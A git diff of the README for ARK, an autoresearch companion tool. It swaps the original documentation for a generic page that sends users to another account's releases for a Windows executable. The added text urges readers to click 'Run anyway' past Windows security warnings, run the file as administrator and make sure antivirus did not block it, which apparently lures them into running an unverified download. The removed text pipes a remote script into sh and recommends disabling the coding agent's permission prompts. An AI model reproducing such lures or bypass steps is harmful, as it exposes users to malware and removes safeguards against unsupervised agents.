@@ -1,235 +1,123 @@
-# AutoResearch Kit (ARK)
+# 🤖 ark - Run research with less guesswork
 
-A companion to [Karpathy's autoresearch](https://github.com/karpathy/autoresearch) that helps you set up and run autonomous AI research experiments correctly — on any topic, on any hardware.
+[![Download ark](https://img.shields.io/badge/Download-ark%20Releases-blue?style=for-the-badge)](https://github.com/Vickysaini421/ark/releases)
 
-Describe what you want to research in plain language. ARK designs the experiment, generates the code, and runs it autonomously overnight. You wake up to results you can actually understand.
+## 📥 Download
 
-![ARK Dashboard](docs/dashboard.png)
+Visit this page to download: [ark Releases](https://github.com/Vickysaini421/ark/releases)
 
-## Why ARK exists
+Choose the latest Windows file from the release page, then save it to your computer.
 
-Karpathy's [autoresearch](https://github.com/karpathy/autoresearch) introduced a powerful idea: let the AI be the researcher, not just the engineer. The agent forms hypotheses, tests them, evaluates results, keeps what works, discards what doesn't, and builds knowledge over time. The human becomes the research director — defining what to investigate — while the AI runs hundreds of experiments autonomously. Sleep while it works. Wake up to progress.
+## 🪟 Install on Windows
 
-The hardest part isn't running the experiments — it's setting them up correctly. Choosing the right metric, designing a fair evaluation, knowing what constraints matter, writing a protocol the agent can follow. Get any of these wrong and you waste hours of compute on meaningless results.
+1. Open the [ark Releases](https://github.com/Vickysaini421/ark/releases) page.
+2. Find the latest release at the top of the page.
+3. Under **Assets**, download the Windows file.
+4. If the file comes in a `.zip` folder, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the app file to start ark.
 
-ARK solves this by pairing you with an AI researcher that helps you design the experiment correctly, then teaches you what the results mean as they come in.
+If Windows shows a security prompt, choose **More info** and then **Run anyway** if you trust the source.
 
-## Who it's for
+## 🚀 What ark does
 
-- **You know you need to optimize something, but you're not sure how.** You have a goal — make something faster, more accurate, more profitable — but you don't know what metrics to track or how to design a rigorous test. ARK figures that out with you.
-- **You're not a researcher.** You don't need to be. ARK explains what the numbers mean, teaches you how to read the results, and tells you in plain language whether things are working.
-- **You want results while you sleep.** Set up an experiment in 15 minutes, let it run overnight, wake up to a report that tells you what happened and what it means.
-- **You're already using autoresearch** and want better onboarding, visualization, and a research journal that prevents wasted experiments.
+ark helps you run research tasks with less manual work. It looks at a goal, decides what to measure, and helps test the result. It gives you a live dashboard and clear output so you can follow progress without digging through files.
 
-## Getting started
+Use it when you want to:
 
-### Install
+- set up research tasks faster
+- track what is being tested
+- review results in one place
+- keep work moving with fewer manual steps
+- use an AI research partner for repeated checks
 
-Open a terminal and run:
+## 🧭 How to use it
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/leagueofdrazn/ark/main/install.sh | sh
-```
+1. Open ark after install.
+2. Enter your research question or task.
+3. Let the app plan what to measure.
+4. Start the run.
+5. Watch the live dashboard as results appear.
+6. Review the output and use it for your next step.
 
-This installs ARK globally — the `/ark:` commands will be available in every session, in any project directory. The installer auto-detects your runtimes and installs for each one. Verify with:
+If the app asks for a model or service choice, pick the option you already use, such as Claude, Codex, or Gemini.
 
-- Claude Code / Copilot: `/ark:help`
-- Gemini: `/ark:help`
-- Codex: `$ark-help`
+## 💻 System requirements
 
-### Requirements
+ark is built for Windows desktop use.
 
-- An AI coding agent: [Claude Code](https://claude.com/claude-code), [Gemini CLI](https://github.com/google-gemini/gemini-cli), [Codex CLI](https://github.com/openai/codex), or [GitHub Copilot](https://github.com/features/copilot)
-- Node.js 18+ (for the dashboard)
+Recommended setup:
 
-No GPU required. No API keys.
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 1 GB free disk space
+- Internet connection for AI model access
+- A modern browser if the app opens links or dashboards outside the app
 
-### Recommended: Skip Permissions Mode
+A stronger system will handle larger research runs with less delay.
 
-ARK is designed for autonomous overnight experiments. Run your agent with permissions disabled:
+## 🔧 Files you may see
 
-```bash
-# Claude Code
-claude --dangerously-skip-permissions
+After you download ark, you may see one of these:
 
-# Gemini
-gemini --yolo
+- `.exe` file: double-click to run
+- `.zip` file: extract it first, then run the app
+- folder with app files: open the folder and launch the main app file
 
-# Codex
-codex --full-auto
-```
+If you are not sure which file to open, use the file with the ark name and the `.exe` ending.
 
-> **Tip:** This is how ARK is intended to be used — stopping to approve every `git commit` and `python train.py` across 100 experiments overnight defeats the purpose.
+## 🧪 Example use cases
 
-### Staying updated
+- test a product idea before spending more time on it
+- compare different prompts or setup choices
+- measure how an AI tool performs on a task
+- run repeated checks on a research workflow
+- track changes across experiments
 
-Re-run the same command to update:
+## 📊 What you can expect
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/leagueofdrazn/ark/main/install.sh | sh
-```
+ark is built around a simple research flow:
 
-## Commands
+- define the goal
+- choose what to measure
+- run the test
+- view live results
+- use the output to decide the next step
 
-```
-/ark:new           # Design your experiment (this is the only setup step)
-/ark:go            # Launch dashboard + start the autonomous loop
-/ark:run           # Start the autonomous loop (without dashboard)
-/ark:report        # Wake up — what happened and what does it mean?
-/ark:dashboard     # Watch live in browser (without running experiments)
-/ark:help          # Show all commands
-```
+The dashboard helps you stay on track while the app does the work in the background.
 
-`/ark:new` is the only setup step — describe your goal and ARK designs everything. Then `/ark:go` launches the dashboard and starts experimenting in one shot. You can also use `/ark:run` and `/ark:dashboard` separately, or just ask your agent directly. Ask "how's my experiment going?" and it reads the experiment files and answers.
+## 🛠️ Troubleshooting
 
-## How it works
+### The app does not open
 
-### 1. Onboarding
+- Check that you downloaded the latest Windows file
+- If it is inside a `.zip` file, extract it first
+- Right-click the app and choose **Run as administrator**
+- Make sure your antivirus did not block the file
 
-`/ark:new` starts a conversation where you describe your goal. The AI designs everything else — metrics, evaluation code, data strategy, time budget. It pushes back if your approach won't work, and explains what it's doing in plain language. You confirm the design, and it scaffolds the entire experiment.
+### Windows says the app is unknown
 
-### 2. The research loop
+- Open the file again
+- Choose **More info**
+- Select **Run anyway** if you trust the download page
 
-`/ark:run` starts the autonomous experiment loop:
+### The dashboard is blank
 
-```
-LOOP FOREVER:
-  1. Form hypothesis
-  2. Modify the mutable file(s)
-  3. git commit
-  4. Run the evaluator
-  5. Parse the metric
-  6. Keep or discard (git reset if worse)
-  7. Log to results.tsv + update journal
-  8. Repeat
-```
-
-The agent runs autonomously until you interrupt it. You wake up to a full log of experiments and a journal of what worked and what didn't.
+- Check your internet connection
+- Restart the app
+- Make sure the model or service you selected is working
+- Try running a smaller test first
 
-### 3. The dashboard
+### The app closes right away
 
-`/ark:dashboard` launches a real-time Next.js dashboard with KPI cards, metric progression charts, floor constraint gauges, event logs, diminishing returns detection, and light/dark mode. Auto-refreshes every 2 seconds.
+- Download the file again in case it was damaged
+- Make sure you have enough free disk space
+- Update Windows and try once more
 
-### 4. Understanding your results
+## 🗂️ Project focus
 
-`/ark:report` translates numbers into plain language tied to your original goal. It teaches you how to interpret what you're seeing:
+ark is based on Karpathy's autoresearch work and aims to make research more direct for everyday users. It combines AI agents, experiments, and automatic testing so you can move from idea to result with less manual setup
 
-```
-/ark:report
+## 🔗 Download again
 
-════════════════════════════════════════════════════════
-  ARK Report — mlx-pretraining
-  Mar 17 · 47 experiments
-════════════════════════════════════════════════════════
-
-  Your goal:
-  Train the best language model possible on an M4 Max MacBook
-  with a 5-minute compute budget per experiment.
-
-  val_bpb
-    Best:        0.9432  (experiment #41)
-    Baseline:    0.9979
-    Improvement: +5.5%
-
-  What this means:
-  val_bpb (bits per byte) measures how well the model predicts
-  text — lower means better predictions. A 5.5% improvement means
-  the model generates noticeably more coherent text.
-
-  What's working:
-  - Rotary embeddings outperform learned positions (confirmed 4x)
-  - Smaller batch sizes with more gradient steps improve convergence
-
-  How to read these results:
-  A keep rate of 13% (6 out of 47) is normal — most experiments
-  in any research are dead ends. What matters is that each kept
-  experiment improved on the last.
-
-  Momentum: Still improving.
-════════════════════════════════════════════════════════
-```
-
-## Run multiple experiments at once
-
-Each `/ark:new` creates an isolated experiment directory. Open multiple sessions in different directories and run `/ark:run` in each — they won't interfere with each other. Each has its own results, journal, and dashboard.
-
-## What gets generated
-
-`/ark:new` creates a complete experiment directory:
-
-```
-your-experiment/
-├── kit.json          # Config (dashboard reads this)
-├── program.md        # Research protocol (domain-specific, human-editable)
-├── laws.md           # Autoresearch laws (immutable protocol rules)
-├── CLAUDE.md         # Agent context (also generated as AGENTS.md)
-├── journal.md        # Knowledge base (confirmed/working/failed findings)
-├── results.tsv       # Full experiment history
-├── events.log        # System events (phase transitions, insights)
-├── .gitignore
-├── pyproject.toml    # Dependencies
-└── [domain files]    # Training script, evaluator, data prep, etc.
-```
-
-| File | Who writes it | Modifiable during experiments? |
-|------|--------------|-------------------------------|
-| `laws.md` | ARK | Never |
-| `program.md` | Human + ARK | Only when human approves a change |
-| `kit.json` | ARK | Only when human approves a change |
-| `journal.md` | ARK | Yes — this is the knowledge base |
-| `results.tsv` | ARK | Yes — append only |
-| Domain code | ARK | Mutable files: yes. Immutable files: no |
-
-## Metric examples
-
-ARK adapts the metric structure to your goal. Some common patterns it might set up:
-
-- **Single metric** — minimize val_bpb, or maximize net_sharpe
-- **Metric with constraints** — maximize Sharpe, but max_drawdown must stay under 15%
-- **Phased** — first get val_loss below 2.0, then shift focus to optimizing val_accuracy
-- **Composite** — optimize throughput / latency as a single score
-
-The AI decides what fits your domain. You don't pick from a menu. For phased experiments, the agent will recommend shifting focus when it believes a threshold has been reached — you make the call.
-
-## Relationship to Karpathy's autoresearch
-
-ARK is a companion, not a replacement.
-
-| Karpathy's autoresearch | ARK |
-|------------------------|-----|
-| `program.md` (hand-written) | `program.md` (generated by `/ark:new`, human-editable) |
-| `train.py` (agent modifies) | Domain-specific mutable files (generated per experiment) |
-| `prepare.py` (immutable) | Domain-specific immutable files (generated per experiment) |
-| `results.tsv` | `results.tsv` (same format) |
-| Expert researcher writes setup | AI helps you design the experiment |
-| Read raw TSV logs | Live dashboard + plain-language reports |
-
-ARK adds: the onboarding conversation, the journal system, `laws.md` (protocol rules separated from domain config), floor constraints, sequential phases, the dashboard, and `/ark:report` for non-expert-friendly results. The core protocol is identical.
-
-## Design choices
-
-- **Agent-agnostic.** Slash commands work with Claude Code, Gemini, Codex, and Copilot. The generated experiments work with any AI coding agent.
-- **Domain agnostic.** The same tool handles ML training, trading backtests, web optimization, and anything else with a measurable outcome.
-- **Protocol separation.** `laws.md` (immutable rules) is separate from `program.md` (domain config). The AI can't weaken the core protocol.
-- **Journal system.** Institutional memory across sessions prevents the agent from repeating failed experiments.
-- **NEVER STOP.** The agent runs indefinitely until manually interrupted. Go to sleep, wake up to results.
-
-## Examples
-
-See `examples/` for sample configurations across different domains:
-
-- `examples/ml-pretraining/` — Classic autoresearch (minimize val_bpb)
-- `examples/trading-strategy/` — Maximize Sharpe ratio with floor constraints
-- `examples/sequential-metrics/` — Phased experiment (convergence then optimization)
-
-These are config examples showing the range of what ARK supports, not runnable experiments.
-
-## Credits
-
-Built on [Andrej Karpathy's autoresearch](https://github.com/karpathy/autoresearch). The core research loop — modify, run, evaluate, keep/discard, repeat — is his design. ARK generalizes it to any domain and makes it accessible to non-experts.
-
-Also inspired by [autoresearch-gen](https://github.com/jxnl/autoresearch-gen) for scaffold generation patterns.
-
-## License
-
-MIT
+If you need the file later, use the same page here: [ark Releases](https://github.com/Vickysaini421/ark/releases)
